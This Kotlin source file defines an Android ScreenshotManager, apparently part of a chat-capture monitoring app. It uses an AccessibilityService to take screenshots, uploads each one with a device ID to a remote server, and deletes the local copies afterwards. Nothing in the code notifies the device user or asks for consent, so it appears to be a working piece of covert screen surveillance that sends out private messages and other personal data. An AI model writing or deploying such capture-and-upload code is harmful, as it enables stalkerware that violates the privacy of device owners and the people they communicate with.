package com.chats.capture.managers

import android.accessibilityservice.AccessibilityService
import android.content.Context
import com.chats.capture.network.ApiClient
import com.chats.capture.utils.ScreenshotCapture
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import timber.log.Timber
import java.io.File

/**
 * Manages screenshot capture and upload
 */
class ScreenshotManager(
    private val context: Context,
    private val accessibilityService: AccessibilityService?
) {
    
    private val screenshotCapture: ScreenshotCapture? = accessibilityService?.let { 
        ScreenshotCapture(it) 
    }
    
    companion object {
        // Track last successful screenshot capture time to prevent rapid duplicates
        // Using companion object so cooldown persists across all ScreenshotManager instances
        @Volatile
        private var lastScreenshotTime: Long = 0
        private const val screenshotCooldownMs = 2000L // 2 seconds cooldown between screenshots
        
        // Mutex to ensure atomic check-and-update of cooldown (prevents race conditions)
        private val cooldownMutex = Mutex()
    }
    
    /**
     * Capture and upload screenshot
     * Returns true if screenshot was captured and uploaded successfully, false otherwise
     * Prevents duplicate captures within cooldown period (thread-safe)
     */
    suspend fun captureAndUploadScreenshot(): Boolean {
        if (screenshotCapture == null) {
            Timber.w("Screenshot capture not available - AccessibilityService required")
            return false
        }
        
        // Atomically check and update cooldown to prevent race conditions
        val currentTime = System.currentTimeMillis()
        val canProceed = cooldownMutex.withLock {
            val timeSinceLastCapture = currentTime - lastScreenshotTime
            if (timeSinceLastCapture < screenshotCooldownMs) {
                Timber.w("Screenshot capture skipped - cooldown active (${screenshotCooldownMs - timeSinceLastCapture}ms remaining)")
                false
            } else {
                // Reserve the slot by updating timestamp immediately
                // This prevents other threads from bypassing cooldown
                lastScreenshotTime = currentTime
                true
            }
        }
        
        if (!canProceed) {
            return false
        }
        
        return try {
            Timber.d("Capturing screenshot...")
            
            // Capture screenshot
            val screenshotPath = screenshotCapture.captureScreenshot()
            if (screenshotPath == null) {
                Timber.e("Failed to capture screenshot")
                // Reset cooldown on failure so retry can happen immediately
                cooldownMutex.withLock {
                    lastScreenshotTime = 0
                }
                return false
            }
            
            Timber.d("Screenshot captured: $screenshotPath")
            
            // Upload screenshot and return result
            val uploadSuccess = uploadScreenshot(screenshotPath)
            
            // Only keep cooldown if upload was successful
            // If upload failed, reset cooldown to allow immediate retry
            if (!uploadSuccess) {
                cooldownMutex.withLock {
                    lastScreenshotTime = 0
                }
            }
            
            // Clean up file even if upload failed to prevent accumulation
            if (!uploadSuccess) {
                try {
                    val file = File(screenshotPath)
                    if (file.exists()) {
                        file.delete()
                        Timber.d("Cleaned up screenshot file after failed upload: $screenshotPath")
                    }
                } catch (e: Exception) {
                    Timber.w(e, "Failed to clean up screenshot file")
                }
            }
            
            uploadSuccess
        } catch (e: Exception) {
            Timber.e(e, "Error capturing and uploading screenshot")
            // Reset cooldown on exception to allow retry
            cooldownMutex.withLock {
                lastScreenshotTime = 0
            }
            false
        }
    }
    
    /**
     * Upload screenshot to server
     * Returns true if upload was successful, false otherwise
     */
    private suspend fun uploadScreenshot(filePath: String): Boolean {
        return try {
            val file = File(filePath)
            if (!file.exists()) {
                Timber.e("Screenshot file does not exist: $filePath")
                return false
            }
            
            val deviceRegistrationManager = DeviceRegistrationManager(context)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            val requestFile = file.asRequestBody("image/png".toMediaType())
            val body = MultipartBody.Part.createFormData("screenshot", file.name, requestFile)
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadScreenshot(deviceId, body)
            
            if (response.isSuccessful && response.body()?.success == true) {
                Timber.d("Screenshot uploaded successfully")
                
                // Delete local file after successful upload
                file.delete()
                true
            } else {
                Timber.w("Failed to upload screenshot: ${response.body()?.message}")
                false
            }
        } catch (e: Exception) {
            Timber.e(e, "Error uploading screenshot")
            false
        }
    }
}